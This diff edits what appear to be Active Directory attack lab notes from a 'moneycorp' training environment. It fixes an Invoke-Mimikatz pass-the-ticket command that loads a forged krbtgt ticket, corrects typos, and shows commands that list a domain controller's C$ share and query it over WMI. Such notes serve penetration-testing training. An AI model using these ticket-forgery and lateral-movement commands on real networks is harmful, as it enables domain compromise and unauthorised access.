@@ -669,11 +669,10 @@ C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:d
 - On any machine of the current domain
 
 ```powershell
-Invoke-Mimikatz -Command '"kerberos::ptt
-C:\AD\Tools\krbtgt_tkt.kirbi"
+Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi"'
 ```
 
-- We can now run command s on remote nmachine
+- We can now run commands on the remote machine
 
 ```powershell
 ls \\mcorp-dc.moneycorp.local.kirbi\c$
@@ -683,3 +682,5 @@ ls \\mcorp-dc.moneycorp.local.kirbi\c$
 gwmi -class win32_operatingsystem -ComputerName mcorp-
 dc.moneycorp.local
 ```
+
+
